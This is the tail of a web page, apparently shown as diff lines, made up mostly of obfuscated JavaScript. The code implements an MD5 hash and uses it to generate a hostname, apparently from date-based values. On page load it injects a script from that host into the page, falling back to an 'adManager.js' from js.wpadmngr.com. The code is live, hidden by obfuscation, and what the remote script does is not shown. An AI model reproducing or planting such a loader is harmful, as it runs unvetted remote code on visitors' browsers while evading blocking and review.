X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
